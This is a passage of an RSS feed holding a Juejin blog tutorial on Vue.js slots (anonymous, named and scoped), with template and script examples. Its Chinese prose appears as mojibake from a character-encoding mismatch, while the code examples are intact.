</code></pre></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[æ’æ§½(Slots)ï¼ˆå®Œæ•´è¯¦ç»†ç‰ˆï¼‰]]></title>    <link>https://juejin.cn/post/7583981974408445962</link>    <guid>https://juejin.cn/post/7583981974408445962</guid>    <pubDate>2025-12-16T03:13:40.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7583981974408445962" data-draft-id="7582528397866123291" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="æ’æ§½(Slots)ï¼ˆå®Œæ•´è¯¦ç»†ç‰ˆï¼‰"/> <meta itemprop="keywords" content="å‰ç«¯,Vue.js"/> <meta itemprop="datePublished" content="2025-12-16T03:13:40.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="nnnnna"/> <meta itemprop="url" content="https://juejin.cn/user/248908298065256"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            æ’æ§½(Slots)ï¼ˆå®Œæ•´è¯¦ç»†ç‰ˆï¼‰
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/248908298065256/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    nnnnna
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-16T03:13:40.000Z" title="Tue Dec 16 2025 03:13:40 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-16
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»1åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">ä¸€ã€åŒ¿åæ’æ§½</h2>
<h3 data-id="heading-1">1.é€‚ç”¨åœºæ™¯</h3>
<p>å­ç»„ä»¶ä¸­åªæœ‰ä¸€ä¸ªä½ç½®å…è®¸çˆ¶ç»„ä»¶è‡ªå®šä¹‰å†…å®¹</p>
<h3 data-id="heading-2">2.ä½¿ç”¨æ–¹æ³•</h3>
<p>ç¬¬ä¸€æ­¥ï¼šåœ¨å­ç»„ä»¶ä¸­å®šä¹‰slotæ’æ§½</p>
<pre><code class="hljs language-å­ç»„ä»¶" lang="å­ç»„ä»¶">&lt;template&gt;
  &lt;div&gt;
    &lt;header&gt;å¤´éƒ¨&lt;/header&gt;
    &lt;slot&gt;&lt;/slot&gt;
    &lt;footer&gt;å°¾éƒ¨&lt;/footer&gt;
  &lt;/div&gt;
&lt;/template&gt;
</code></pre>
<p>ç¬¬äºŒæ­¥ï¼šåœ¨çˆ¶ç»„ä»¶ä¸­çš„å­ç»„ä»¶æ ‡ç­¾å†…ç›´æ¥å¡«å†™éœ€è¦æ’å…¥çš„å†…å®¹</p>
<pre><code class="hljs language-çˆ¶ç»„ä»¶" lang="çˆ¶ç»„ä»¶">&lt;template&gt;
  &lt;div&gt;
    &lt;TestComOne&gt;
      &lt;p&gt;æ’å…¥çš„æ–°å†…å®¹&lt;/p&gt;
    &lt;/TestComOne&gt;
  &lt;/div&gt;
&lt;/template&gt;
</code></pre>
<p>æœ€ç»ˆåœ¨å­ç»„ä»¶æ¸²æŸ“å‡ºæ¥çš„ç»“æœï¼š</p>
<pre><code class="hljs language-æ¸²æŸ“" lang="æ¸²æŸ“">&lt;template&gt;
  &lt;div&gt;
    &lt;header&gt;å¤´éƒ¨&lt;/header&gt;
    &lt;p&gt;æ’å…¥çš„æ–°å†…å®¹&lt;/p&gt;
    &lt;footer&gt;å°¾éƒ¨&lt;/footer&gt;
  &lt;/div&gt;
&lt;/template&gt;
</code></pre>
<p>å½“çˆ¶ç»„ä»¶ä¸­æ²¡æœ‰æä¾›æ’æ§½å†…å®¹æ—¶ï¼Œæˆ‘ä»¬ä¹Ÿå¯ä»¥ç»™å­ç»„ä»¶çš„æ’æ§½ä¸­æ·»åŠ é»˜è®¤å†…å®¹</p>
<pre><code class="hljs language-æ·»åŠ é»˜è®¤å†…å®¹" lang="æ·»åŠ é»˜è®¤å†…å®¹">&lt;template&gt;
  &lt;div&gt;
    &lt;header&gt;å¤´éƒ¨&lt;/header&gt;
    &lt;slot&gt;é»˜è®¤å†…å®¹&lt;/slot&gt;
    &lt;footer&gt;å°¾éƒ¨&lt;/footer&gt;
  &lt;/div&gt;
&lt;/template&gt;
</code></pre>
<p>æœ€ç»ˆåœ¨å­ç»„ä»¶æ¸²æŸ“å‡ºæ¥çš„ç»“æœï¼š</p>
<pre><code class="hljs language-æ¸²æŸ“" lang="æ¸²æŸ“">&lt;template&gt;
  &lt;div&gt;
    &lt;header&gt;å¤´éƒ¨&lt;/header&gt;
    é»˜è®¤å†…å®¹
    &lt;footer&gt;å°¾éƒ¨&lt;/footer&gt;
  &lt;/div&gt;
&lt;/template&gt;
</code></pre>
<h2 data-id="heading-3">äºŒã€å…·åæ’æ§½</h2>
<h3 data-id="heading-4">1.é€‚ç”¨åœºæ™¯</h3>
<p>å­ç»„ä»¶ä¸­æœ‰å¤šä¸ªä½ç½®å…è®¸çˆ¶ç»„ä»¶è‡ªå®šä¹‰å†…å®¹</p>
<h3 data-id="heading-5">2.ä½¿ç”¨æ–¹æ³•</h3>
<p>ç¬¬ä¸€æ­¥ï¼šåœ¨å­ç»„ä»¶ä¸­å®šä¹‰å¤šä¸ªslotæ’æ§½ï¼Œå¹¶ä¸”ä¸ºæ¯ä¸ªæ’æ§½æ·»åŠ ä¸€ä¸ªç‰¹æ®Šçš„attributeÂ <code>name</code></p>
<pre><code class="hljs language-å¤šä¸ªæ’æ§½" lang="å¤šä¸ªæ’æ§½">&lt;template&gt;
  &lt;div&gt;
    &lt;slot name="slotTop"&gt;&lt;/slot&gt;
    &lt;header&gt;å¤´éƒ¨&lt;/header&gt;
    &lt;slot name="slotContent"&gt;&lt;/slot&gt;
    &lt;footer&gt;å°¾éƒ¨&lt;/footer&gt;
    &lt;slot name="slotBottom"&gt;&lt;/slot&gt;
  &lt;/div&gt;
&lt;/template&gt;
</code></pre>
<p>ç¬¬äºŒæ­¥ï¼šåœ¨çˆ¶ç»„ä»¶ä¸­ä½¿ç”¨å¯¹åº”çš„æ’æ§½å</p>
<pre><code class="hljs language-çˆ¶ç»„ä»¶ä¸­ä½¿ç”¨å¤šä¸ªæ’æ§½" lang="çˆ¶ç»„ä»¶ä¸­ä½¿ç”¨å¤šä¸ªæ’æ§½">&lt;template&gt;
  &lt;div&gt;
    &lt;TestComOne&gt;
      &lt;template #slotTop&gt;å¤´éƒ¨ä¸Šé¢&lt;/template&gt;
      &lt;template #slotContent&gt;ä¸­é—´&lt;/template&gt;
      &lt;template #slotBottom&gt;å°¾éƒ¨ä¸‹é¢&lt;/template&gt;
    &lt;/TestComOne&gt;
  &lt;/div&gt;
&lt;/template&gt;
</code></pre>
<h2 data-id="heading-6">ä¸‰ã€ä½œç”¨åŸŸæ’æ§½</h2>
<h3 data-id="heading-7">1.ä¸ºä»€ä¹ˆè¦ä½¿ç”¨ä½œç”¨åŸŸæ’æ§½</h3>
<p>åœ¨æŸäº›åœºæ™¯ä¸‹ï¼Œæˆ‘ä»¬æƒ³è¦æ’æ§½çš„å†…å®¹ä½¿ç”¨åˆ°å­ç»„ä»¶åŸŸå†…çš„æ•°æ®ï¼Œè¿™æ—¶å€™å°±éœ€è¦ç”¨åˆ°æ’æ§½</p>
<h3 data-id="heading-8">2.ä½¿ç”¨æ–¹æ³•</h3>
<p>ç¬¬ä¸€æ­¥ï¼šåœ¨å­ç»„ä»¶ä¸­ï¼Œå¯ä»¥åƒç»„ä»¶ä¼ é€’propsé‚£æ ·ï¼Œå‘ä¸€ä¸ªæ’æ§½slotä¼ é€’<code>attributes</code></p>
<pre><code class="hljs language-å­ç»„ä»¶æ·»åŠ attributes" lang="å­ç»„ä»¶æ·»åŠ attributes">&lt;template&gt;
  &lt;div&gt;
    &lt;slot name="slotTop"&gt;&lt;/slot&gt;
    &lt;header&gt;å¤´éƒ¨&lt;/header&gt;
    &lt;slot name="slotContent" height="180" :list="list"&gt;&lt;/slot&gt;
    &lt;footer&gt;å°¾éƒ¨&lt;/footer&gt;
    &lt;slot name="slotBottom"&gt;&lt;/slot&gt;
  &lt;/div&gt;
&lt;/template&gt;

&lt;script setup lang="ts"&gt;
import { ref } from "vue";
const list = ref({ name: "å¼ ä¸‰", old: 18 });
&lt;/script&gt;
</code></pre>
<p>ç¬¬äºŒæ­¥ï¼šåœ¨çˆ¶ç»„ä»¶ä¸­ä½¿ç”¨è§£æ„èµ‹å€¼ï¼Œæ‹¿åˆ°å¯¹åº”çš„å€¼</p>
<pre><code class="hljs language-çˆ¶ç»„ä»¶ä¸­ä½¿ç”¨" lang="çˆ¶ç»„ä»¶ä¸­ä½¿ç”¨">&lt;template&gt;
  &lt;div&gt;
    &lt;TestComOne&gt;
      &lt;template #slotContent="{ height, list }"&gt;
        &lt;p&gt;èº«é«˜ï¼š{{ height }}&lt;/p&gt;
        &lt;p&gt;å§“åï¼š{{ list.name }}&lt;/p&gt;
        &lt;p&gt;å¹´é¾„ï¼š{{ list.old }}&lt;/p&gt;
      &lt;/template&gt;
    &lt;/TestComOne&gt;
  &lt;/div&gt;
&lt;/template&gt;

&lt;script setup lang="ts"&gt;
import TestComOne from "./components/index.vue";
&lt;/script&gt;
</code></pre></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item>  </channel></rss>